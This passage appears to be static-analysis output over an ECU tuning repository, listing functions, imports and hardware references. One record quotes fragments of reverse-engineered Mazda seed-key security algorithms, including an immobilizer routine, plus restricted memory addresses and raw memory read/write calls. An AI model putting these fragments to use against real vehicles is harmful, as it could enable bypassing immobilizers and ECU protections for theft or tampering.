[{"type": "security_pattern", "line": 10, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 107, "pattern": "hash", "content": "checksum = hashlib.sha256(tune_data).hexdigest()"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/backend/main.py", "lines_read": 445, "features_found": [{"type": "function", "name": "__init__", "line": 73}, {"type": "function", "name": "disconnect", "line": 85}, {"type": "function", "name": "__init__", "line": 120}, {"type": "import", "module": "fastapi", "line": null}, {"type": "import", "module": "fastapi.middleware.cors", "line": null}, {"type": "import", "module": "fastapi.staticfiles", "line": null}, {"type": "import", "module": "fastapi.responses", "line": null}, {"type": "import", "module": "pydantic", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "FastAPI,", "line": null}, {"type": "import", "module": "CORSMiddleware", "line": null}, {"type": "import", "module": "StaticFiles", "line": null}, {"type": "import", "module": "FileResponse", "line": null}, {"type": "import", "module": "BaseModel", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "uvicorn", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "ECUData", "line": 42}, {"type": "class", "name": "TuneFile", "line": 54}, {"type": "class", "name": "VehicleInfo", "line": 62}, {"type": "class", "name": "ConnectionManager", "line": 70}, {"type": "class", "name": "MockECUInterface", "line": 117}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 28, "hardware": "ECU", "content": "description=\"ECU Tuning System Backend\","}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "class ECUData(BaseModel):"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "\"\"\"ECU live data model\"\"\""}, {"type": "hardware", "line": 62, "hardware": "vehicle", "content": "class VehicleInfo(BaseModel):"}, {"type": "hardware", "line": 63, "hardware": "vehicle", "content": "\"\"\"Vehicle information model\"\"\""}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "ecu_part_number: str"}, {"type": "hardware", "line": 75, "hardware": "vehicle", "content": "self.vehicle_data: Dict[str, Any] = {}"}, {"type": "hardware", "line": 117, "hardware": "ECU", "content": "class MockECUInterface:"}, {"type": "hardware", "line": 118, "hardware": "ECU", "content": "\"\"\"Mock ECU interface for testing\"\"\""}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "self.current_data = ECUData("}, {"type": "hardware", "line": 144, "hardware": "ECU", "content": "async def read_live_data(self) -> ECUData:"}, {"type": "hardware", "line": 150, "hardware": "ECU", "content": "raise Exception(\"ECU not connected\")"}, {"type": "hardware", "line": 167, "hardware": "ECU", "content": "ecu_interface = MockECUInterface()"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "\"ecu_connected\": ecu_interface.is_connected,"}, {"type": "hardware", "line": 185, "hardware": "ECU", "content": "@app.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 186, "hardware": "ECU", "content": "async def connect_ecu():"}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "\"\"\"Connect to ECU\"\"\""}, {"type": "hardware", "line": 189, "hardware": "ECU", "content": "success = await ecu_interface.connect()"}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "asyncio.create_task(stream_ecu_data())"}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "return {\"success\": True, \"message\": \"ECU connected successfully\"}"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "return {\"success\": False, \"message\": \"Failed to connect to ECU\"}"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "logger.error(f\"ECU connection error: {e}\")"}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "@app.post(\"/api/ecu/disconnect\")"}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "async def disconnect_ecu():"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "await ecu_interface.disconnect()"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "return {\"success\": True, \"message\": \"ECU disconnected\"}"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "logger.error(f\"ECU disconnection error: {e}\")"}, {"type": "hardware", "line": 210, "hardware": "ECU", "content": "@app.get(\"/api/ecu/live-data\")"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "\"\"\"Get current ECU live data\"\"\""}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "if not ecu_interface.is_connected:"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "raise HTTPException(status_code=400, detail=\"ECU not connected\")"}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "data = await ecu_interface.read_live_data()"}, {"type": "hardware", "line": 223, "hardware": "vehicle", "content": "@app.get(\"/api/vehicle/info\")"}, {"type": "hardware", "line": 224, "hardware": "vehicle", "content": "async def get_vehicle_info():"}, {"type": "hardware", "line": 225, "hardware": "vehicle", "content": "\"\"\"Get vehicle information\"\"\""}, {"type": "hardware", "line": 227, "hardware": "vehicle", "content": "return VehicleInfo("}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "ecu_part_number=\"L3K9-18-881A\","}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "\"\"\"Flash tune to ECU\"\"\""}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "if not ecu_interface.is_connected:"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "raise HTTPException(status_code=400, detail=\"ECU not connected\")"}, {"type": "hardware", "line": 298, "hardware": "ECU", "content": "logger.info(f\"Flashing tune {tune_id} to ECU\")"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "if not ecu_interface.is_connected:"}, {"type": "hardware", "line": 342, "hardware": "ECU", "content": "raise HTTPException(status_code=400, detail=\"ECU not connected\")"}, {"type": "hardware", "line": 372, "hardware": "ECU", "content": "if ecu_interface.is_connected:"}, {"type": "hardware", "line": 373, "hardware": "ECU", "content": "live_data = await ecu_interface.read_live_data()"}, {"type": "hardware", "line": 395, "hardware": "ECU", "content": "async def stream_ecu_data():"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "\"\"\"Stream ECU data to all connected clients\"\"\""}, {"type": "hardware", "line": 397, "hardware": "ECU", "content": "while ecu_interface.is_connected:"}, {"type": "hardware", "line": 401, "hardware": "ECU", "content": "live_data = await ecu_interface.read_live_data()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/backend/static/index.html", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["muts"]}
{"file_path": "muts_tuner/backend/test_api.py", "lines_read": 408, "features_found": [{"type": "function", "name": "client", "line": 23}, {"type": "function", "name": "test_root_endpoint", "line": 34}, {"type": "function", "name": "test_status_endpoint", "line": 43}, {"type": "function", "name": "test_ecu_connect_endpoint", "line": 53}, {"type": "function", "name": "test_ecu_disconnect_endpoint", "line": 61}, {"type": "function", "name": "test_live_data_endpoint_without_connection", "line": 73}, {"type": "function", "name": "test_live_data_endpoint_with_connection", "line": 79}, {"type": "function", "name": "test_vehicle_info_endpoint", "line": 95}, {"type": "function", "name": "test_tunes_endpoint", "line": 106}, {"type": "function", "name": "test_diagnostics_endpoint", "line": 120}, {"type": "function", "name": "test_clear_dtcs_endpoint", "line": 131}, {"type": "function", "name": "test_health_endpoint", "line": 142}, {"type": "function", "name": "test_invalid_endpoint", "line": 252}, {"type": "function", "name": "test_tune_flash_without_connection", "line": 257}, {"type": "function", "name": "test_tune_flash_invalid_id", "line": 263}, {"type": "function", "name": "test_concurrent_requests", "line": 276}, {"type": "function", "name": "test_complete_monitoring_workflow", "line": 343}, {"type": "function", "name": "test_complete_tuning_workflow", "line": 373}, {"type": "function", "name": "make_request", "line": 283}, {"type": "import", "module": "fastapi.testclient", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "main", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "pytest", "line": null}, {"type": "import", "module": "websockets", "line": null}, {"type": "import", "module": "TestClient", "line": null}, {"type": "import", "module": "httpx", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "app,", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "queue", "line": null}], "components_found": [{"type": "class", "name": "TestBackendAPI", "line": 19}, {"type": "class", "name": "TestWebSocketFunctionality", "line": 151}, {"type": "class", "name": "TestECUInterface", "line": 211}, {"type": "class", "name": "TestErrorHandling", "line": 249}, {"type": "class", "name": "TestPerformance", "line": 273}, {"type": "class", "name": "TestIntegrationWorkflow", "line": 340}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 17, "hardware": "ECU", "content": "from main import app, ecu_interface, manager"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "assert \"ecu_connected\" in data"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "def test_ecu_connect_endpoint(self, client):"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "\"\"\"Test ECU connection endpoint\"\"\""}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "def test_ecu_disconnect_endpoint(self, client):"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "\"\"\"Test ECU disconnection endpoint\"\"\""}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/disconnect\")"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "\"\"\"Test live data endpoint when ECU not connected\"\"\""}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "response = client.get(\"/api/ecu/live-data\")"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "assert \"ECU not connected\" in response.json()[\"detail\"]"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "\"\"\"Test live data endpoint when ECU is connected\"\"\""}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "response = client.get(\"/api/ecu/live-data\")"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "def test_vehicle_info_endpoint(self, client):"}, {"type": "hardware", "line": 96, "hardware": "vehicle", "content": "\"\"\"Test vehicle information endpoint\"\"\""}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "response = client.get(\"/api/vehicle/info\")"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "required_fields = [\"vin\", \"ecu_part_number\", \"calibration_id\", \"software_version\"]"}, {"type": "hardware", "line": 134, "hardware": "ECU", "content": "client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 183, "hardware": "ECU", "content": "await self.connect_ecu_via_api()"}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "async def connect_ecu_via_api(self):"}, {"type": "hardware", "line": 206, "hardware": "ECU", "content": "\"\"\"Helper method to connect ECU via API\"\"\""}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "response = await client.post(\"http://localhost:8000/api/ecu/connect\")"}, {"type": "hardware", "line": 211, "hardware": "ECU", "content": "class TestECUInterface:"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "\"\"\"Test suite for ECU interface functionality\"\"\""}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "async def test_mock_ecu_connection(self):"}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "\"\"\"Test mock ECU connection\"\"\""}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "result = await ecu_interface.connect()"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "assert ecu_interface.is_connected is True"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "async def test_mock_ecu_live_data(self):"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "\"\"\"Test mock ECU live data generation\"\"\""}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "await ecu_interface.connect()"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "data = await ecu_interface.read_live_data()"}, {"type": "hardware", "line": 240, "hardware": "ECU", "content": "async def test_mock_ecu_disconnection(self):"}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "\"\"\"Test mock ECU disconnection\"\"\""}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "await ecu_interface.connect()"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "await ecu_interface.disconnect()"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "assert ecu_interface.is_connected is False"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "\"\"\"Test tune flashing without ECU connection\"\"\""}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "assert \"ECU not connected\" in response.json()[\"detail\"]"}, {"type": "hardware", "line": 266, "hardware": "ECU", "content": "client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 346, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 350, "hardware": "vehicle", "content": "response = client.get(\"/api/vehicle/info\")"}, {"type": "hardware", "line": 352, "hardware": "vehicle", "content": "vehicle_data = response.json()"}, {"type": "hardware", "line": 353, "hardware": "vehicle", "content": "assert vehicle_data[\"vin\"] is not None"}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "response = client.get(\"/api/ecu/live-data\")"}, {"type": "hardware", "line": 370, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/disconnect\")"}, {"type": "hardware", "line": 376, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/connect\")"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "response = client.get(\"/api/ecu/live-data\")"}, {"type": "hardware", "line": 402, "hardware": "ECU", "content": "response = client.post(\"/api/ecu/disconnect\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/README.md", "lines_read": 148, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/advanced_ecu_access.py", "lines_read": 621, "features_found": [{"type": "function", "name": "display_warning", "line": 46}, {"type": "function", "name": "__init__", "line": 81}, {"type": "function", "name": "activate_advanced_mode", "line": 90}, {"type": "function", "name": "_initialize_security_algorithms", "line": 113}, {"type": "function", "name": "_initialize_memory_map", "line": 127}, {"type": "function", "name": "_initialize_advanced_protocols", "line": 186}, {"type": "function", "name": "request_security_access", "line": 206}, {"type": "function", "name": "_request_security_seed", "line": 254}, {"type": "function", "name": "_send_security_key", "line": 276}, {"type": "function", "name": "_mazda_27_algorithm", "line": 299}, {"type": "function", "name": "_mazda_27_enhanced_algorithm", "line": 319}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 341}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 360}, {"type": "function", "name": "_mazda_manufacturer_l1_algorithm", "line": 382}, {"type": "function", "name": "_mazda_manufacturer_l2_algorithm", "line": 401}, {"type": "function", "name": "_derive_vin_keys", "line": 424}, {"type": "function", "name": "_get_manufacturer_key_l1", "line": 447}, {"type": "function", "name": "_get_manufacturer_key_l2", "line": 451}, {"type": "function", "name": "dump_memory_region", "line": 455}, {"type": "function", "name": "_read_memory_by_address", "line": 494}, {"type": "function", "name": "write_memory_region", "line": 520}, {"type": "function", "name": "_write_memory_by_address", "line": 569}, {"type": "function", "name": "_update_region_checksum", "line": 596}, {"type": "function", "name": "get_memory_map_info", "line": 606}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "AdvancedModeWarning", "line": 22}, {"type": "class", "name": "SecurityLevel", "line": 56}, {"type": "class", "name": "MemoryRegion", "line": 66}, {"type": "class", "name": "AdvancedECUAccess", "line": 75}], "algorithms": [{"type": "algorithm_function", "line": 113, "content": "def _initialize_security_algorithms(self) -> Dict[str, Any]:"}, {"type": "algorithm_function", "line": 299, "content": "def _mazda_27_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 319, "content": "def _mazda_27_enhanced_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 341, "content": "def _mazda_tcm_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 360, "content": "def _mazda_immobilizer_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 382, "content": "def _mazda_manufacturer_l1_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 401, "content": "def _mazda_manufacturer_l2_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "algorithm_function", "line": 424, "content": "def _derive_vin_keys(self, vin: str):"}], "protocols": [{"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing', 0xFFA000, 0x800,"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps', 0xFFA800, 0x800,"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control', 0xFFB000, 0x400,"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps', 0xFFB400, 0x400,"}, {"type": "protocol", "line": 150, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit', 0xFFB800, 0x100,"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit', 0xFFB900, 0x100,"}, {"type": "protocol", "line": 160, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn', 0xFFC000, 0x200,"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim', 0xFFC200, 0x200,"}, {"type": "protocol", "line": 170, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader', 0xFF0000, 0x1000,"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers', 0xFFFF00, 0x100,"}, {"type": "protocol", "line": 178, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area', 0xFFFFF0, 0x10,"}, {"type": "protocol", "line": 259, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_request = bytes([0x27, level])"}, {"type": "protocol", "line": 261, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x27, bytes([level]))"}, {"type": "protocol", "line": 266, "protocol": "0x[0-9A-Fa-f]+", "content": "if response[0] == 0x67 and response[1] == level:"}, {"type": "protocol", "line": 281, "protocol": "0x[0-9A-Fa-f]+", "content": "key_send = bytes([0x27, level + 0x01]) + key"}, {"type": "protocol", "line": 283, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x27, bytes([level + 0x01]) + key)"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "if response[0] == 0x67 and response[1] == level and len(response) >= 3:"}, {"type": "protocol", "line": 289, "protocol": "0x[0-9A-Fa-f]+", "content": "return response[2] == 0x00"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Main ECU 0x27 security algorithm - factory dealer level\"\"\""}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed[i] ^ 0x73) + i"}, {"type": "protocol", "line": 310, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 311, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 320, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Enhanced 0x27 security algorithm\"\"\""}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 3) | (temp >> 5)) & 0xFF"}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= [0x47, 0x11, 0x83, 0x25][i]"}, {"type": "protocol", "line": 331, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2D + i) & 0xFF"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (~temp & 0xFF) ^ 0xA5"}, {"type": "protocol", "line": 349, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 350, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 351, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 352, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 415, "protocol": "0x[0-9A-Fa-f]+", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "protocol", "line": 495, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Read memory by address using 0x23 service\"\"\""}, {"type": "protocol", "line": 500, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID"}, {"type": "protocol", "line": 508, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x23, payload[1:])"}, {"type": "protocol", "line": 510, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x63:  # Positive response"}, {"type": "protocol", "line": 570, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Write memory by address using 0x3D service\"\"\""}, {"type": "protocol", "line": 574, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x3D)  # Service ID"}, {"type": "protocol", "line": 585, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x3D, payload[1:])"}, {"type": "protocol", "line": 587, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response[0] == 0x7D:  # Positive response"}, {"type": "protocol", "line": 588, "protocol": "0x[0-9A-Fa-f]+", "content": "return response[1] == 0x00  # Check for write success"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "ADVANCED ECU PROGRAMMING MODULE"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "\u2551 This module contains manufacturer-level ECU access techniques that may:      \u2551"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "\u2551 \u2022 Bypass security access controls                                           \u2551"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "\u2551 \u2022 Access restricted ECU memory areas                                        \u2551"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "\u2551 \u2022 Own the vehicle and ECU being accessed                                     \u2551"}, {"type": "hardware", "line": 35, "hardware": "vehicle", "content": "\u2551 \u2022 Own the vehicle and ECU being accessed                                     \u2551"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "\u2551 \u2022 Have legal right to modify your vehicle's ECU                             \u2551"}, {"type": "hardware", "line": 36, "hardware": "vehicle", "content": "\u2551 \u2022 Have legal right to modify your vehicle's ECU                             \u2551"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\u2551 \u2022 Understand the risks of ECU damage                                        \u2551"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "class SecurityLevel(IntEnum):"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "\"\"\"ECU Security Access Levels\"\"\""}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"ECU Memory Region Definition\"\"\""}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "access_level: SecurityLevel"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "class AdvancedECUAccess:"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "Manufacturer-level ECU access capabilities"}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "def __init__(self, ecu_core):"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "self.ecu_core = ecu_core"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "self.security_algorithms = self._initialize_security_algorithms()"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "self.current_security_level = SecurityLevel.LEVEL_1"}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "logger.info(\"Advanced ECU Access initialized\")"}, {"type": "hardware", "line": 106, "hardware": "ECU", "content": "logger.warning(\"Advanced ECU access mode activated\")"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "def _initialize_security_algorithms(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "\"\"\"Initialize reverse-engineered security algorithms\"\"\""}, {"type": "hardware", "line": 118, "hardware": "TCM", "content": "'mazda_tcm_6spd': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 119, "hardware": "immobilizer", "content": "'mazda_immobilizer': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 124, "hardware": "ECU", "content": "logger.debug(f\"Initialized {len(algorithms)} security algorithms\")"}, {"type": "hardware", "line": 128, "hardware": "ECU", "content": "\"\"\"Initialize complete ECU memory map\"\"\""}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "'16x16 ignition timing map', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "'16x16 fuel injection map', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "'Boost target and control maps', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "'Variable valve timing maps', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "'RPM limiter settings', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 155, "hardware": "ECU", "content": "'Speed governor settings', SecurityLevel.LEVEL_3"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "'Knock adaptation tables', SecurityLevel.LEVEL_4"}, {"type": "hardware", "line": 165, "hardware": "ECU", "content": "'Long/short term fuel trims', SecurityLevel.LEVEL_4"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "'ECU bootloader and reprogramming routines', SecurityLevel.LEVEL_6, writable=False"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "'security_registers': MemoryRegion("}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "'security_registers', 0xFFFF00, 0x100,"}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": "'Security access control registers', SecurityLevel.LEVEL_6, writable=False"}, {"type": "hardware", "line": 179, "hardware": "ECU", "content": "'ECU calibration checksums', SecurityLevel.LEVEL_5"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "if not self.ecu_core.current_connection:"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "logger.error(\"No ECU connection available\")"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 195, "hardware": "vehicle", "content": "vehicle_info = self.ecu_core.read_vehicle_identification()"}, {"type": "hardware", "line": 196, "hardware": "vehicle", "content": "if vehicle_info and 'vin' in vehicle_info:"}, {"type": "hardware", "line": 197, "hardware": "vehicle", "content": "self._derive_vin_keys(vehicle_info['vin'])"}, {"type": "hardware", "line": 206, "hardware": "ECU", "content": "def request_security_access(self, level: SecurityLevel,"}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "Request security access at specified level"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "level: Security level to access"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "logger.info(f\"Requesting security access level {level}\")"}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "if level not in [SecurityLevel.LEVEL_1, SecurityLevel.LEVEL_2, SecurityLevel.LEVEL_3]:"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "logger.warning(f\"Security level {level} requires additional authorization\")"}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "seed = self._request_security_seed(level)"}, {"type": "hardware", "line": 227, "hardware": "ECU", "content": "logger.error(\"Failed to obtain security seed\")"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "algorithm = self.security_algorithms.get(algorithm_name)"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "logger.error(f\"Unknown security algorithm: {algorithm_name}\")"}, {"type": "hardware", "line": 238, "hardware": 